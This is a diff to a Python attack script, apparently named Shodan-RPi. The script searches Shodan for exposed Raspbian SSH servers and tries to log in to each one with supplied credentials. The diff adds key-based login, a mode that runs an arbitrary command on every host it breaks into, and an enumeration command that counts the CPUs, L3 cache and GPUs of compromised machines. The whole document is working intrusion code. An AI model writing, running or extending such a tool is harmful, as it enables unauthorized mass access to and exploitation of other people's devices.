@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 
-import argparse, os, socket, sys
+import argparse, os, socket, sys, time
 try:
 	from colorama import Fore, init
 	import paramiko, shodan
@@ -16,6 +16,7 @@ except ModuleNotFoundError:
 	sys.exit(1)
 
 api_key = None # Set to None if you want to provide a key through arguments
+version = "1.0.0/py3-devtest"
 
 init() # Colored output
 
@@ -61,6 +62,17 @@ parser.add_argument('-s', '--search-string',
                     metavar='SSTRING',
                     type=str,
                     default='Raspbian SSH')
+parser.add_argument('-sk', '--ssh-key',
+                    help='Try auth with KEY as SSH key',
+                    metavar='KEY',
+                    type=str) # Public key auth (disabled with Shodan)
+parser.add_argument('-c', '--command',
+                    help='Run CMD after a successful connection',
+                    metavar='CMD',
+                    type=str) # For example, run uname -a or lscpu
+parser.add_argument('--enum',
+                    help='Enumerate system specs',
+                    action='store_true') # GPUs/CPUs/RAM...
 args = parser.parse_args()
 
 failtext = Fore.RED + '\tFAILED' + Fore.RESET
@@ -136,17 +148,27 @@ def apikey():
 	else:
 		return args.api_key
 
-def connect(server, username, password):
+def connect(server, username, password=None, key=None, cmd=None):
 	"""
 		SSH connect function
 	"""
 	try:
-		ssh.connect(server, username=username, password=password, timeout=5) # Lowered timeout from 8 to 5
+		if password != None:
+			ssh.connect(server, username=username, password=password, timeout=5)
+		elif key != None:
+			ssh.connect(server, username=username, key_filename=key, timeout=5)
 		with open(args.workfile, 'a') as fl:
 			fl.write(server+'\n')
 			fl.close()
+		if args.command:
+			si, so, se = ssh.exec_command(cmd)
+			time.sleep(1)
+			si.close()
 		ssh.close()
-		return 0 # Success
+		if args.command:
+			return so.readlines()
+		else:
+			return 0 # Success
 	except paramiko.AuthenticationException:
 		return 1 # Authentication error
 	except paramiko.ssh_exception.NoValidConnectionsError:
@@ -168,15 +190,16 @@ def main():
 	else:
 		shres = None
 	if args.input == None:
-		targets = arrayWrite(shodandata=shres) # In-memory
+		targets = arrayWrite(shodandata=shres) # Temporary results
 	else:
 		targets = fileGet(shodandata=shres) # From file
 	print(('[i] %s found\n' % (str(len(targets)) + ' target' if len(targets) < 2 else str(len(targets)) + ' targets')))
 	try:
 		for ip in targets:
 			counter += 1
-			print(('[%s] Trying %s... ' % (counter, ip)))
-			r = connect(ip, args.username, args.password)
+			print('[%s] %s ' % (counter, ip), end='')
+#			if args.
+			r = connect(ip, args.username, password=args.password, key=args.ssh_key, cmd=args.command)
 			if r == 1:
 				reason = ' [AUTHENT]' if args.debug else ''
 				print((failtext + reason))
@@ -189,11 +212,14 @@ def main():
 			elif r == 5:
 				reason = ' [UNKNOWN]' if args.debug else ''
 				print((failtext + reason))
-			elif r == 0:
-				success += 1
-				print(succtext)
 			elif r == 9:
 				raise KeyboardInterrupt
+			else:
+				success += 1
+				if not args.command:
+					print(succtext)
+				else:
+					print('\t%s' % r[0].replace('\n', ''))
 		if not args.no_exit:
 			print(('\n[+] Completed!\n    Total IPs tried: %s\n    Total successes: %s\n' % (counter, success)))
 	except KeyboardInterrupt:
@@ -201,15 +227,22 @@ def main():
 		sys.exit(0)
 
 if __name__ == "__main__":
-	print('[i] Shodan-RPi [Python 3]\n    by btx3 (based on code by somu1795)')
+	print('[i] Shodan-RPi %s\n    by btx3 (based on code by somu1795)' % version)
 	if args.input != None:
 		print(('\n[i] Reading from %s' % args.input))
 	else:
-		print('\n[i] Running from in-memory data')
+		print('\n[i] Running with temporary results')
 	if fileExists() == False:
 		key = apikey()
 	if args.log_paramiko:
 		paramiko.util.log_to_file(args.log_paramiko)
+	if args.enum and args.command:
+		print('[-] Can\'t use --enum and --command together!')
+		sys.exit(1)
+	if args.enum:
+		# Enumeration command (CPUs, L3, GPUs)
+		# It will print an empty string in there's no L3, TODO
+		args.command = "bash -c \"echo '$(nproc) CPUs | $(lscpu | awk \'/L3 cache:/{print $3}\' || echo NO) L3 | $(lspci | grep -e \'NVIDIA\' -e \'AMD\' | wc -l || echo NO) GPU(s)'\""
 	if args.no_exit and not args.input:
 		print('[!] Running indefinitely! Press Ctrl+C to stop.')
 		while True:
